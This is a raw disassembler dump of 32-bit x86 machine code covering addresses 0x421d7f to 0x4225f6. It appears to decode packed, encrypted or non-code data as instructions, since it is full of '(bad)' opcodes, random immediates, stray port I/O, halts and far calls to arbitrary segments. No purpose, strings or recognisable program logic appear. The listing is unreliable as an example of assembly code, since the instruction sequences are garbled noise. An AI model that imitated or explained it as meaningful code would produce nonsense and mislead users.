  421d7f:	dec    esp
  421d80:	cmp    eax,0x1d6be6fa
  421d85:	xchg   ecx,eax
  421d86:	push   ds
  421d87:	imul   esi,DWORD PTR [esi+0x7d0bac85],0xd2e26ea0
  421d91:	int3   
  421d92:	push   edi
  421d93:	sbb    al,0x86
  421d95:	mov    edx,0x91638879
  421d9a:	aaa    
  421d9b:	mov    esi,0xabd74607
  421da0:	out    dx,al
  421da1:	xor    BYTE PTR [eax+0x7fb47451],bh
  421da7:	xchg   esi,eax
  421da8:	aas    
  421da9:	cs ja  0x421dc4
  421dac:	push   esi
  421dad:	mov    dl,0x7
  421daf:	js     0x421d5c
  421db1:	adc    bl,BYTE PTR [edx+0x79666d06]
  421db7:	mov    eax,?
  421db9:	ret    0xa438
  421dbc:	ret    
  421dbd:	fwait
  421dbe:	cli    
  421dbf:	sub    ecx,edi
  421dc1:	fist   WORD PTR [esi-0x192d1ce1]
  421dc7:	daa    
  421dc8:	inc    eax
  421dc9:	dec    ebp
  421dca:	xor    DWORD PTR [ebx+0x421134e4],esp
  421dd0:	sar    BYTE PTR [ebp-0x25fbca48],1
  421dd6:	ret    0xc16f
  421dd9:	sbb    ebx,esp
  421ddb:	ret    
  421ddc:	stc    
  421ddd:	lock mul BYTE PTR [ecx+0x67]
  421de1:	mov    al,0x9b
  421de3:	mov    DWORD PTR [ebx-0x24],ebp
  421de6:	pop    ds
  421de7:	enter  0x87dd,0xa
  421deb:	or     BYTE PTR [esi+0x13567b67],cl
  421df1:	jbe    0x421e55
  421df3:	sub    BYTE PTR [edi-0x440b9025],cl
  421df9:	shl    BYTE PTR ds:0xa2aa6026,0xce
  421e00:	xchg   ebx,eax
  421e01:	cmp    DWORD PTR [esi*8+0x5eaf8bdc],0xffffffb7
  421e09:	sbb    esi,0xcb616882
  421e0f:	adc    ebp,DWORD PTR [edi+0x12]
  421e12:	xor    ch,BYTE PTR [esi-0x46]
  421e15:	and    edi,DWORD PTR [esi+0x31eb4ed2]
  421e1b:	sbb    eax,0xa25d3f9f
  421e20:	div    BYTE PTR [edx]
  421e22:	(bad)  
  421e23:	cmc    
  421e24:	xchg   edi,eax
  421e25:	inc    edi
  421e26:	jo     0x421e5f
  421e28:	call   0x4f74:0x6d830956
  421e2f:	sbb    ebp,eax
  421e31:	xor    BYTE PTR [ebp+0x1c9ec259],ch
  421e37:	pop    eax
  421e38:	test   eax,0x7b182121
  421e3d:	neg    DWORD PTR [edi+0x1]
  421e40:	sar    ch,cl
  421e42:	pop    ebx
  421e43:	xor    BYTE PTR [esi-0x639df486],ah
  421e49:	shr    BYTE PTR cs:[edx],1
  421e4c:	hlt    
  421e4d:	xor    ebx,DWORD PTR [esi-0x3cc7fcbd]
  421e53:	popf   
  421e54:	cli    
  421e55:	lahf   
  421e56:	das    
  421e57:	dec    esp
  421e58:	test   DWORD PTR [ebx],0x72daaffa
  421e5e:	repnz aad 0xa3
  421e61:	lds    ebp,FWORD PTR [eax+0x39ae5d2d]
  421e67:	or     ecx,eax
  421e69:	cmp    bh,al
  421e6b:	add    al,0xf5
  421e6d:	inc    ebp
  421e6e:	leave  
  421e6f:	mov    bl,0xb
  421e71:	popf   
  421e72:	(bad)  
  421e73:	pop    ss
  421e74:	popa   
  421e75:	or     al,0x6d
  421e77:	jp     0x421e2e
  421e79:	and    BYTE PTR [esi+0xc],ch
  421e7c:	dec    ecx
  421e7d:	xchg   ebp,eax
  421e7e:	mov    DWORD PTR [ebx+edi*8+0x43a1c7f3],edx
  421e85:	jp     0x421ec3
  421e87:	mov    ds:0x646e5927,al
  421e8c:	loop   0x421e2b
  421e8e:	adc    DWORD PTR [ebx],esp
  421e90:	push   edx
  421e91:	call   0x85b82525
  421e96:	enter  0xe929,0x72
  421e9a:	data16 lahf 
  421e9c:	fist   DWORD PTR [edi+0x3d769bc6]
  421ea2:	into   
  421ea3:	jp     0x421e98
  421ea5:	push   edx
  421ea6:	push   0x83b59794
  421eab:	add    bl,ah
  421ead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eae:	cmc    
  421eaf:	mov    ebx,0x44657396
  421eb4:	aaa    
  421eb5:	jle    0x421e8b
  421eb7:	or     eax,0x8f72f4a7
  421ebc:	scas   eax,DWORD PTR es:[edi]
  421ebd:	jmp    0x421e86
  421ebf:	mov    cs,WORD PTR [eax+ebp*1]
  421ec2:	dec    ebp
  421ec3:	sbb    BYTE PTR [ebp-0x73],dh
  421ec6:	ds xchg esi,eax
  421ec8:	inc    BYTE PTR [ebx+eax*2+0x4046ed83]
  421ecf:	dec    ecx
  421ed0:	icebp  
  421ed1:	ja     0x421f16
  421ed3:	jp     0x421e5f
  421ed5:	(bad)  
  421ed6:	lock pushf 
  421ed8:	cmp    cl,al
  421eda:	push   0x75d510f
  421edf:	pop    es
  421ee0:	jbe    0x421f35
  421ee2:	das    
  421ee3:	sahf   
  421ee4:	mov    eax,ds:0xcc7dc123
  421ee9:	shl    al,0x68
  421eec:	retf   
  421eed:	shl    DWORD PTR [ecx-0x39dc409c],cl
  421ef3:	xor    eax,0x7f56d20f
  421ef8:	sub    BYTE PTR [ecx+ebp*1+0x18ec981f],0x61
  421f00:	push   edx
  421f01:	mov    esi,0x1cff6a5
  421f06:	and    DWORD PTR [ebp+0x47],eax
  421f09:	lock sahf 
  421f0b:	sub    cl,BYTE PTR [ebp-0x3b]
  421f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f0f:	sub    BYTE PTR ds:0xf14c8c7,0xa3
  421f16:	xchg   ebx,eax
  421f17:	xor    ah,ah
  421f19:	pop    edi
  421f1a:	hlt    
  421f1b:	inc    edi
  421f1c:	in     eax,dx
  421f1d:	xlat   BYTE PTR ds:[ebx]
  421f1e:	cmp    eax,0x3681228d
  421f23:	dec    esi
  421f24:	shl    BYTE PTR [eax-0x55dad755],1
  421f2a:	loopne 0x421f30
  421f2c:	jg     0x421ee1
  421f2e:	shr    BYTE PTR [esi-0x67fcae73],1
  421f34:	dec    ecx
  421f35:	pop    esi
  421f36:	and    DWORD PTR [ebx-0x21d655e3],ebx
  421f3c:	stos   DWORD PTR es:[edi],eax
  421f3d:	fwait
  421f3e:	add    al,0xb4
  421f40:	cli    
  421f41:	(bad)  
  421f42:	fwait
  421f43:	cs data16 scas al,BYTE PTR es:[edi]
  421f46:	fsub   st,st(4)
  421f48:	js     0x421ef1
  421f4a:	repz dec eax
  421f4c:	ss cmc 
  421f4e:	stc    
  421f4f:	push   edi
  421f50:	div    DWORD PTR ss:[eax+0x4dfa9114]
  421f57:	jle    0x421f5e
  421f59:	xor    al,0x5
  421f5b:	lods   al,BYTE PTR ds:[esi]
  421f5c:	add    dh,bh
  421f5e:	(bad)  
  421f5f:	in     eax,dx
  421f60:	or     BYTE PTR [esi],ch
  421f62:	lds    esi,FWORD PTR [ebp-0x6355dc7c]
  421f68:	inc    esp
  421f69:	mov    esp,0x19fa62ed
  421f6e:	rol    al,cl
  421f70:	mov    eax,0xe8f27ba0
  421f75:	mov    ch,0x6d
  421f77:	inc    eax
  421f78:	cmp    esp,DWORD PTR [esi-0x55]
  421f7b:	repnz mov ds:0xb78344dc,eax
  421f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f82:	add    al,0x3f
  421f84:	stos   BYTE PTR es:[edi],al
  421f85:	enter  0x2a60,0xf9
  421f89:	mov    DWORD PTR [edx+0x5],esi
  421f8c:	adc    DWORD PTR [edi+ebx*1+0x755808dd],0x1393ff55
  421f97:	repnz adc ebp,edi
  421f9a:	(bad)  
  421f9b:	(bad)  
  421f9c:	pop    ecx
  421f9d:	retf   
  421f9e:	ror    DWORD PTR [ebx+0x33],1
  421fa1:	shl    ebp,1
  421fa3:	push   0x86dc3d7c
  421fa8:	mov    edx,cs
  421faa:	and    BYTE PTR ds:0x5ee36e8f,0x66
  421fb1:	jno    0x421fb3
  421fb3:	imul   BYTE PTR ss:[ebx]
  421fb6:	adc    al,cl
  421fb8:	mov    WORD PTR [esi+0x56f959ef],?
  421fbe:	xchg   esi,eax
  421fbf:	inc    ecx
  421fc0:	test   BYTE PTR [ebp-0x27],bl
  421fc3:	mov    ds:0xc3e5073b,al
  421fc8:	jecxz  0x421f4a
  421fca:	mov    eax,ds:0x6ead5ecf
  421fcf:	push   es
  421fd0:	retf   0x7ac9
  421fd3:	xor    al,0x40
  421fd5:	shl    dh,1
  421fd7:	pop    ebp
  421fd8:	loop   0x42201d
  421fda:	inc    ebp
  421fdb:	dec    edi
  421fdc:	or     eax,0x3017e1db
  421fe1:	mov    cl,0xa2
  421fe3:	retf   
  421fe4:	sub    BYTE PTR [ecx-0x4c],al
  421fe7:	cmp    ecx,DWORD PTR [ecx+ebx*4+0x4e]
  421feb:	adc    dl,BYTE PTR [eax-0x6695f824]
  421ff1:	sub    al,0xd0
  421ff3:	popf   
  421ff4:	retf   0x541b
  421ff7:	shr    BYTE PTR [ecx-0x4515c77b],cl
  421ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ffe:	xchg   edx,eax
  421fff:	ds call 0x4178:0xbaa4b549
  422007:	ja     0x422079
  422009:	mov    dl,0xe6
  42200b:	push   0x2b
  42200d:	out    0xd6,al
  42200f:	cdq    
  422010:	xor    eax,0x1c81d7e1
  422015:	pop    esp
  422016:	mov    dl,dl
  422018:	mov    edx,ecx
  42201a:	dec    ebp
  42201b:	jo     0x422006
  42201d:	mov    edi,0x55814d28
  422022:	fsub   DWORD PTR [ecx]
  422024:	mov    dl,0x36
  422026:	div    DWORD PTR [ecx+0x1b5bd8b7]
  42202c:	jl     0x421fcf
  42202e:	mov    cl,0xfa
  422030:	in     eax,dx
  422031:	mov    dl,0x41
  422033:	mov    DWORD PTR [edi+0x5f8a4097],0xfda5e65d
  42203d:	xor    BYTE PTR [esi-0x50],al
  422040:	pop    edx
  422041:	(bad)  
  422042:	and    DWORD PTR [edi-0x57],edx
  422045:	push   cs
  422046:	pop    ebp
  422047:	mov    al,0x36
  422049:	or     ebx,DWORD PTR [edx+0x6f]
  42204c:	push   es
  42204d:	mov    edi,0x3e2d0140
  422052:	repnz add ah,BYTE PTR [ebx]
  422055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422056:	mov    ds:0x2a34877e,eax
  42205b:	mov    ebp,0x5294cb9c
  422060:	xchg   ebp,eax
  422061:	add    edi,DWORD PTR [ebx-0x27927611]
  422067:	call   0x1eb8:0xc9c74770
  42206e:	inc    ebp
  42206f:	jp     0x4220a1
  422071:	sub    DWORD PTR [edi-0x6dd8b469],ebx
  422077:	jmp    0x4220d2
  422079:	ds cwde 
  42207b:	rcr    DWORD PTR [edi+ebx*1],1
  42207e:	pop    esi
  42207f:	repz fadd QWORD PTR [ecx+0x5ceae591]
  422086:	(bad)  
  422087:	jg     0x42201e
  422089:	loope  0x42205e
  42208b:	mov    ebp,0xcb584d17
  422090:	repz sahf 
  422092:	xchg   DWORD PTR [eax+0x3fd72c49],edx
  422098:	xchg   esp,eax
  422099:	jbe    0x42209c
  42209b:	jmp    0x422112
  42209d:	sub    al,0xe3
  42209f:	push   ss
  4220a0:	test   BYTE PTR [ebx],dh
  4220a2:	icebp  
  4220a3:	mov    ebp,0x2f03040f
  4220a8:	xor    eax,0x473609db
  4220ad:	inc    ecx
  4220ae:	dec    esi
  4220af:	or     al,0x5
  4220b1:	jns    0x4220bc
  4220b3:	retf   0xf1fe
  4220b6:	adc    dl,BYTE PTR [eax]
  4220b8:	push   esi
  4220b9:	icebp  
  4220ba:	pop    esp
  4220bb:	inc    ebp
  4220bc:	loope  0x422132
  4220be:	dec    esi
  4220bf:	push   ecx
  4220c0:	mov    edi,?
  4220c2:	ds ror edx,1
  4220c5:	pop    ecx
  4220c6:	or     ebp,DWORD PTR [edi-0x4f]
  4220c9:	jae    0x422121
  4220cb:	ret    0x34de
  4220ce:	or     al,0x41
  4220d0:	xor    BYTE PTR [esi+0x734297df],ah
  4220d6:	jmp    0x2bedc4d9
  4220db:	fdiv   DWORD PTR [ecx+0x7b]
  4220de:	cmp    ebx,eax
  4220e0:	jno    0x42213e
  4220e2:	pop    esp
  4220e3:	inc    edx
  4220e4:	gs loopne 0x4220b9
  4220e7:	xchg   DWORD PTR [ebx+0x77],ebx
  4220ea:	lods   eax,DWORD PTR ds:[esi]
  4220eb:	cli    
  4220ec:	mov    esp,0xfac95ff7
  4220f1:	ins    BYTE PTR es:[edi],dx
  4220f2:	mov    edi,0x7119f53f
  4220f7:	jl     0x422146
  4220f9:	push   0x4d78899f
  4220fe:	mov    DWORD PTR [ebp-0x79],0x2346c3c5
  422105:	ins    BYTE PTR es:[edi],dx
  422106:	adc    edx,DWORD PTR [esi+0x2a]
  422109:	dec    di
  42210b:	mov    edi,esi
  42210d:	xor    BYTE PTR [edx],0x1d
  422110:	xor    edi,edx
  422112:	mov    bl,0xde
  422114:	and    eax,0xd2f6800c
  422119:	into   
  42211a:	adc    ch,cl
  42211c:	das    
  42211d:	push   0xffffffc4
  42211f:	cmp    cl,BYTE PTR ds:0x55e77b8f
  422125:	sub    cl,BYTE PTR [eax+0x6d]
  422128:	ret    
  422129:	lahf   
  42212a:	push   esi
  42212b:	retf   
  42212c:	adc    bh,BYTE PTR [ecx]
  42212e:	daa    
  42212f:	mov    ah,0x35
  422131:	(bad)  
  422132:	push   edx
  422133:	(bad)  
  422134:	ds inc esp
  422136:	ins    DWORD PTR es:[edi],dx
  422137:	jmp    0xefc3:0xa27a34a1
  42213e:	js     0x4221a5
  422140:	scas   al,BYTE PTR es:[edi]
  422141:	cli    
  422142:	sbb    edx,esi
  422144:	addr16 call 0x725e:0x74830821
  42214c:	repz xchg ecx,eax
  42214e:	push   0xffffffce
  422150:	push   ebp
  422151:	jno    0x4220f2
  422153:	int    0xe2
  422155:	ret    
  422156:	or     eax,0x3dc9b896
  42215b:	imul   ebp,DWORD PTR [ecx],0x70217379
  422161:	jo     0x422173
  422163:	pmullw mm5,QWORD PTR [esi+0x25]
  422167:	lahf   
  422168:	mov    dh,0x30
  42216a:	in     eax,0x43
  42216c:	mov    ah,0x6a
  42216e:	mov    eax,0xd15310bf
  422173:	into   
  422174:	mov    ds:0x986f3434,al
  422179:	pop    esi
  42217a:	(bad)  
  42217b:	jmp    0x4221d7
  42217d:	into   
  42217e:	dec    ecx
  42217f:	pushf  
  422180:	test   al,0xe5
  422182:	pop    eax
  422183:	jns    0x422130
  422185:	pop    es
  422186:	xchg   ebp,eax
  422187:	pop    es
  422188:	test   al,0x8b
  42218a:	xor    eax,0x7dbd9083
  42218f:	sbb    bh,BYTE PTR [ebp+0x7c]
  422192:	mov    edx,0x7c90b89d
  422197:	(bad)  
  422198:	cmp    ebp,DWORD PTR [ecx-0x6cc9e5dd]
  42219e:	mov    bl,0xad
  4221a0:	inc    edx
  4221a1:	inc    ecx
  4221a2:	xchg   ebp,eax
  4221a3:	sub    BYTE PTR [esi-0x67],bh
  4221a6:	dec    ebx
  4221a7:	dec    esi
  4221a8:	pop    edx
  4221a9:	repz mov ch,0x63
  4221ac:	nop
  4221ad:	ror    DWORD PTR [edx-0x76],1
  4221b0:	retf   
  4221b1:	dec    edi
  4221b2:	and    ebx,DWORD PTR [ebx+esi*8]
  4221b5:	inc    ebp
  4221b6:	jbe    0x422140
  4221b8:	pop    ss
  4221b9:	pop    es
  4221ba:	out    dx,al
  4221bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221bc:	mov    ah,0x73
  4221be:	aam    0x74
  4221c0:	and    ebx,DWORD PTR [esi+eiz*4-0x67]
  4221c4:	bound  ecx,QWORD PTR [edx]
  4221c6:	sub    ebx,DWORD PTR [eax+0x3e6dda6d]
  4221cc:	pop    es
  4221cd:	data16 mov dl,0xe
  4221d0:	mov    ecx,DWORD PTR [eax]
  4221d2:	jecxz  0x4221fa
  4221d4:	sbb    al,0x90
  4221d6:	cmp    ecx,DWORD PTR [edi+0x2b93c32f]
  4221dc:	and    DWORD PTR [ebp+0x3d],edi
  4221df:	pop    ebx
  4221e0:	mov    edi,0x464b0f9a
  4221e5:	dec    edx
  4221e6:	punpcklwd xmm5,XMMWORD PTR [ebp+0x373fc64f]
  4221ee:	xchg   esi,eax
  4221ef:	aad    0x6
  4221f1:	and    DWORD PTR [edx-0x634edf9c],esp
  4221f7:	fsubr  QWORD PTR [ebx+0x8]
  4221fa:	lods   eax,DWORD PTR ds:[esi]
  4221fb:	sbb    al,0xf8
  4221fd:	std    
  4221fe:	sahf   
  4221ff:	sub    DWORD PTR [edx-0x65],edx
  422202:	adc    bl,BYTE PTR [ecx+0x58]
  422205:	fiadd  DWORD PTR [edx]
  422207:	adc    DWORD PTR [eax+0x31],0x7
  42220b:	into   
  42220c:	mov    ecx,0xf76270a0
  422211:	xor    DWORD PTR [edi+edx*8+0x3896f1e2],0x8fc6085b
  42221c:	ret    0x4c6
  42221f:	and    ebx,DWORD PTR [esp+edx*1-0x4a5f6633]
  422226:	jnp    0x422290
  422228:	retf   
  422229:	std    
  42222a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42222b:	jne    0x4221f7
  42222d:	aas    
  42222e:	adc    BYTE PTR [esi-0x1c4f8958],dh
  422234:	cmp    dh,dl
  422236:	fist   WORD PTR [edi]
  422238:	fisttp WORD PTR [ecx+0xb]
  42223b:	int    0x2e
  42223d:	jl     0x422299
  42223f:	test   DWORD PTR [ebp+edx*8+0x77],ebx
  422243:	fs addr16 (bad) 
  422247:	int3   
  422248:	popa   
  422249:	inc    ecx
  42224a:	mov    esp,0x832bbb12
  42224f:	gs adc eax,esi
  422252:	inc    ebp
  422253:	and    eax,0xf7990b96
  422258:	jbe    0x4222d7
  42225a:	retf   
  42225b:	add    al,0x7a
  42225d:	in     eax,dx
  42225e:	xlat   BYTE PTR ds:[ebx]
  42225f:	retf   0x10f0
  422262:	adc    eax,0x3bf21f8d
  422267:	mov    esi,0x7c8e1aee
  42226c:	scas   al,BYTE PTR es:[edi]
  42226d:	push   esp
  42226e:	jl     0x422298
  422270:	dec    esi
  422271:	repnz pop ds
  422273:	dec    esi
  422274:	cdq    
  422275:	hlt    
  422276:	add    eax,0x2948bdd
  42227b:	into   
  42227c:	mov    dh,0x87
  42227e:	test   eax,0x628a8eb5
  422283:	retf   
  422284:	and    ebp,ebp
  422286:	gs jmp 0xf50a:0x8fe28bb5
  42228e:	pop    esp
  42228f:	cld    
  422290:	(bad)  
  422291:	push   ecx
  422292:	sti    
  422293:	mov    dh,0x6a
  422295:	cwde   
  422296:	and    eax,0x4f20d095
  42229b:	mov    ebx,0x8ed09f8a
  4222a0:	sar    BYTE PTR [edi+0x12253833],cl
  4222a6:	mov    edx,0x2a5600d2
  4222ab:	dec    edi
  4222ac:	aad    0xc3
  4222ae:	sbb    BYTE PTR [edi+0x44],dl
  4222b1:	data16 sar BYTE PTR [edx+0x73],0x0
  4222b6:	nop
  4222b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222b8:	daa    
  4222b9:	shl    BYTE PTR [edi-0x41dbb302],cl
  4222bf:	dec    esi
  4222c0:	mov    ah,0x83
  4222c2:	xchg   DWORD PTR [eax-0x235b17b6],ecx
  4222c8:	pop    eax
  4222c9:	sub    DWORD PTR [edx+0x5a8e2035],edx
  4222cf:	adc    BYTE PTR [ebp-0x2e98fe91],ah
  4222d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222d6:	(bad)  
  4222d8:	inc    eax
  4222d9:	sub    eax,0x86169c24
  4222de:	and    DWORD PTR [eax],ebx
  4222e0:	pop    ss
  4222e1:	or     eax,0x3345577c
  4222e6:	cmp    BYTE PTR [edx-0x44],0xae
  4222ea:	xor    ecx,ecx
  4222ec:	add    al,0xd6
  4222ee:	dec    ebx
  4222ef:	lds    ebx,FWORD PTR [ebx+0x6c]
  4222f2:	or     dh,BYTE PTR [esi-0x36]
  4222f5:	shr    DWORD PTR [ebx-0x13],cl
  4222f8:	xchg   esp,eax
  4222f9:	jno    0x4222bd
  4222fb:	inc    ebp
  4222fc:	repz jbe 0x4222ef
  4222ff:	in     al,0xea
  422301:	imul   edx,edi,0xa798fbb3
  422307:	push   eax
  422308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422309:	rol    BYTE PTR [esi+0x5f],1
  42230c:	mov    esp,0x1d5996c6
  422311:	and    ch,cl
  422313:	lods   eax,DWORD PTR ds:[esi]
  422314:	retf   
  422315:	les    esi,FWORD PTR [ebx+esi*1-0x6f]
  422319:	mov    eax,ds:0xeb6ed7d5
  42231e:	sub    DWORD PTR [esi],eax
  422320:	ins    BYTE PTR es:[edi],dx
  422321:	cmp    edx,edx
  422323:	sbb    DWORD PTR [ebp+0x17d4270d],ebx
  422329:	pushf  
  42232a:	frstor [ebx-0x59f90e64]
  422330:	sbb    dl,BYTE PTR [edi]
  422332:	push   esi
  422333:	pop    eax
  422334:	jl     0x42237f
  422336:	push   eax
  422337:	idiv   DWORD PTR [esi+edi*1-0x1a]
  42233b:	mov    bl,0x80
  42233d:	cdq    
  42233e:	idiv   ebx
  422340:	xchg   BYTE PTR [edi-0x5b],ah
  422343:	mov    ch,0x98
  422345:	fisubr WORD PTR [ebp+0x5274c4a5]
  42234b:	mov    bl,0x44
  42234d:	lock in al,dx
  42234f:	ss cs mov ecx,0x14809502
  422356:	sub    eax,edi
  422358:	mov    al,0x1e
  42235a:	aas    
  42235b:	rcr    esp,0x7b
  42235e:	test   BYTE PTR [eax-0x4f],bl
  422361:	shl    esp,0xd2
  422364:	out    dx,eax
  422365:	daa    
  422366:	xor    eax,0xa61b048a
  42236b:	jp     0x4223c8
  42236d:	mov    esp,0xd247a3a5
  422372:	dec    ebp
  422373:	ret    0x753e
  422376:	pusha  
  422377:	loopne 0x422354
  422379:	stos   BYTE PTR es:[edi],al
  42237a:	test   al,0x29
  42237c:	fiadd  DWORD PTR [edi-0x4ca1f671]
  422382:	push   ebx
  422383:	fdiv   QWORD PTR [edx]
  422385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422386:	dec    ebx
  422387:	xchg   esp,eax
  422388:	mov    esp,0x4c0c7ec2
  42238d:	mov    ch,BYTE PTR [ecx]
  42238f:	mov    ch,0x7
  422391:	xlat   BYTE PTR ds:[ebx]
  422392:	test   al,0x6
  422394:	push   cs
  422395:	jnp    0x422388
  422397:	add    eax,0xf1938e0a
  42239c:	mov    cl,0x89
  42239e:	inc    ebp
  42239f:	add    eax,0xc184d281
  4223a4:	or     eax,0x757518b0
  4223a9:	fild   QWORD PTR [ecx]
  4223ab:	and    cl,0x7c
  4223ae:	test   DWORD PTR [eax],esi
  4223b0:	aad    0xf8
  4223b2:	repz jge 0x42236e
  4223b5:	mov    ecx,0xbcf5fc78
  4223ba:	(bad)  [ecx]
  4223bc:	add    al,0x1d
  4223be:	loope  0x42239d
  4223c0:	rol    DWORD PTR [edx],1
  4223c2:	jg     0x422440
  4223c4:	dec    esp
  4223c5:	push   esp
  4223c6:	pop    ds
  4223c7:	(bad)  
  4223c8:	and    eax,0x313eda39
  4223cd:	push   ecx
  4223cf:	(bad)  
  4223d0:	out    0xb0,ax
  4223d3:	mov    bh,0x80
  4223d5:	pop    es
  4223d6:	out    0xd1,eax
  4223d8:	push   edx
  4223d9:	mov    ah,0x90
  4223db:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4223dd:	lea    ebx,[eax-0x6c]
  4223e0:	in     al,0xb2
  4223e2:	aaa    
  4223e3:	mov    ds:0x1d5dc3aa,al
  4223e8:	jp     0x422448
  4223ea:	pop    ss
  4223eb:	jp     0x42239b
  4223ed:	(bad)  
  4223ef:	ret    
  4223f0:	xchg   ebx,eax
  4223f1:	fidiv  WORD PTR [ebx-0x6e4ec1be]
  4223f7:	mov    cl,0x3
  4223f9:	(bad)  
  4223fa:	jp     0x422466
  4223fc:	stc    
  4223fd:	retf   0x5ec3
  422400:	js     0x4223db
  422402:	icebp  
  422403:	imul   edx,eax,0x5625f382
  422409:	das    
  42240a:	sar    DWORD PTR [edi],cl
  42240c:	mov    al,ds:0x2b6f289d
  422411:	fs mov eax,fs:0xb35b4b8
  422418:	dec    esp
  422419:	dec    eax
  42241a:	push   ecx
  42241b:	(bad)  
  42241c:	(bad)  
  42241d:	xor    BYTE PTR [ebx],ch
  42241f:	sub    al,0x16
  422422:	sub    eax,0x4dbb71dc
  422427:	test   al,0x88
  422429:	shl    DWORD PTR [ebx-0x14],0xa4
  42242d:	xor    dl,BYTE PTR [edi+0x4]
  422430:	and    al,0x5c
  422432:	loope  0x4223bd
  422434:	in     al,dx
  422435:	out    0xb1,eax
  422437:	aad    0x8d
  422439:	outs   dx,BYTE PTR ds:[esi]
  42243a:	inc    ecx
  42243b:	outs   dx,BYTE PTR ds:[esi]
  42243c:	outs   dx,BYTE PTR ds:[esi]
  42243d:	xor    ah,BYTE PTR [ecx+eiz*4-0x63]
  422441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422442:	ss push edi
  422444:	ins    DWORD PTR es:[edi],dx
  422445:	aas    
  422446:	bound  eax,QWORD PTR [esi-0x286063ec]
  42244c:	pop    eax
  42244d:	pop    es
  42244e:	push   cs
  42244f:	retf   0x91ae
  422452:	xor    al,0x3a
  422454:	mov    ebx,0x26fdc5e4
  422459:	hlt    
  42245a:	lahf   
  42245b:	or     al,0x34
  42245d:	aam    0x66
  42245f:	mov    DWORD PTR [edx],ecx
  422461:	dec    eax
  422462:	sar    DWORD PTR [ebp+0x40],1
  422465:	xor    DWORD PTR cs:[eax+0x5d8892a],esp
  42246c:	scas   al,BYTE PTR es:[edi]
  42246d:	jg     0x42243e
  42246f:	inc    ebp
  422470:	aaa    
  422471:	add    eax,0x1c8a9fbc
  422476:	xor    eax,0x4f223585
  42247b:	push   ss
  42247c:	lea    ecx,ds:[edx+0xe]
  422480:	in     eax,dx
  422481:	xchg   esp,eax
  422482:	pop    es
  422483:	mov    edx,0xa4609222
  422488:	daa    
  422489:	jnp    0x4224d0
  42248b:	int3   
  42248c:	outs   dx,DWORD PTR ds:[esi]
  42248d:	popf   
  42248e:	inc    esp
  42248f:	sbb    eax,0x4abfb6de
  422494:	shl    BYTE PTR [edi+0x58],1
	...
  422513:	add    bh,al
  422515:	stc    
  422516:	out    0xe3,eax
  422518:	(bad)  
  422519:	inc    edi
  42251b:	std    
  42251c:	fidivr WORD PTR [ebx]
  42251e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251f:	dec    esp
  422520:	or     dl,BYTE PTR [esi]
  422522:	xchg   edi,eax
  422523:	sti    
  422524:	arpl   WORD PTR [ebx+0x76b0001],di
  42252a:	add    BYTE PTR [eax],al
  42252c:	push   ebp
  42252d:	mov    ds:0x31613c13,eax
  422532:	ficom  DWORD PTR gs:[ebx-0x4a33853e]
  422539:	call   0xd3df:0xa16377f2
  422540:	stc    
  422541:	inc    edx
  422542:	add    al,0x2
  422544:	out    dx,eax
  422545:	mov    ch,0x97
  422547:	ret    
  422548:	and    dl,al
  42254a:	sahf   
  42254b:	scas   al,BYTE PTR es:[edi]
  42254c:	out    dx,eax
  42254d:	jno    0x42252c
  42254f:	adc    BYTE PTR ds:0xa4d4fdf2,ch
  422555:	out    dx,eax
  422556:	push   ebp
  422557:	cwde   
  422558:	loop   0x42258e
  42255a:	xor    ah,BYTE PTR [esi]
  42255c:	inc    edx
  42255d:	and    BYTE PTR [edx+edx*4-0x605284a1],dh
  422564:	xor    dh,BYTE PTR [edi+0x2e]
  422567:	push   edi
  422568:	loopne 0x4225c9
  42256a:	mov    DWORD PTR [esi+ecx*1],ebx
  42256d:	int3   
  42256e:	sti    
  42256f:	in     eax,dx
  422570:	push   edi
  422571:	mov    ds:0x443266bf,al
  422576:	je     0x4225ad
  422578:	dec    esi
  422579:	stc    
  42257a:	sub    DWORD PTR [eax+0xed5795c],0x65b5d468
  422584:	cs mov dh,0x30
  422587:	sub    edi,eax
  422589:	out    0xe5,al
  42258b:	xchg   edx,eax
  42258c:	xor    eax,DWORD PTR [ecx-0x6]
  42258f:	jno    0x42260b
  422591:	es mov ecx,0xfd2f1905
  422597:	out    0x85,al
  422599:	(bad)  
  42259b:	push   esp
  42259c:	(bad)  [edi]
  42259e:	inc    ecx
  42259f:	aad    0x83
  4225a1:	call   0x58b10197
  4225a6:	and    eax,0xeebe5f26
  4225ab:	dec    edi
  4225ac:	test   al,0xde
  4225ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225af:	stc    
  4225b0:	fcmovbe st,st(3)
  4225b2:	(bad)  
  4225b3:	pop    ds
  4225b4:	cmp    DWORD PTR [esi-0x6d],ecx
  4225b7:	push   esp
  4225b8:	sbb    ch,BYTE PTR [esi-0x6a7bd72]
  4225be:	sahf   
  4225bf:	scas   al,BYTE PTR es:[edi]
  4225c0:	or     al,0x41
  4225c2:	jle    0x422562
  4225c4:	add    DWORD PTR [esi],esp
  4225c6:	ss scas al,BYTE PTR es:[edi]
  4225c8:	repnz rol BYTE PTR [ecx+0x10b4339c],0xba
  4225d0:	in     eax,dx
  4225d1:	js     0x4225cb
  4225d3:	jl     0x42261e
  4225d5:	repz xor eax,0xe7d2cd72
  4225db:	xor    DWORD PTR [esi-0x6e],edx
  4225de:	popf   
  4225df:	xchg   BYTE PTR [eax],ch
  4225e1:	popa   
  4225e2:	and    al,0x83
  4225e4:	fild   DWORD PTR [ebp-0x80ce5cd]
  4225ea:	pop    ss
  4225eb:	mov    ecx,DWORD PTR [ecx+0x59]
  4225ee:	out    dx,eax
  4225ef:	call   0x30d15f63
  4225f4:	inc    edx
  4225f5:	inc    edi
  4225f6:	sub    eax,0x128eff1b
